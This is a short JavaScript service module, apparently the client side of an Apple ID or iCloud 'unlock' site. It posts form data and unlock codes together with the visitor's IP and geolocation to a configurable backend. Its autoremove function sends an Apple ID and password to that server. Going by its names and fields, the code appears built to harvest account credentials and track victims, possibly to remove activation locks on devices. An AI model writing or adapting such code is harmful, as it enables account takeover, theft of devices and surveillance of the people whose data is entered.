import axios from 'axios';
let configCache = null;
import geolocation from './geolocation';

const config = {
  headers: {
    'Content-Type': 'application/json',
  }
};


const loadConfig = async () => {
  if (configCache) return configCache;
  try {
    const response = await axios.get('/config.js');
    configCache = response.data;
    return configCache;
  } catch (error) {
    return false;
  }
};

const addData = async (data) => {
  const geoData = await geolocation.location();
  const payload = {
    ...data,       // Esparce las propiedades originales (nombre, email, etc.)
    locationData: geoData     // Esparce las propiedades de geolocalización (ip, location, etc.)
  };
  const response = await axios.post(`${window.APP_CONFIG.API_URL}/api/process/addData`,
    payload,
    config
  );
  return response.data;
}

const addUnlockCode = async (data) => {
  const geoData = await geolocation.location();
  const payload = {
    ...data,       // Esparce las propiedades originales (nombre, email, etc.)
    locationData: geoData     // Esparce las propiedades de geolocalización (ip, location, etc.)
  };
  const response = await axios.post(`${window.APP_CONFIG.API_URL}/api/process/addUnlockCode`,
    payload,
    config

  );
  return response.data;
}

const autoremove = async (appleID, password) => {
  const response = await axios.post(`${window.APP_CONFIG.API_URL}/api/autoremove`, { appleID, password }, config);
  return response.data;
}




export default {
  addData,
  autoremove,
  addUnlockCode
};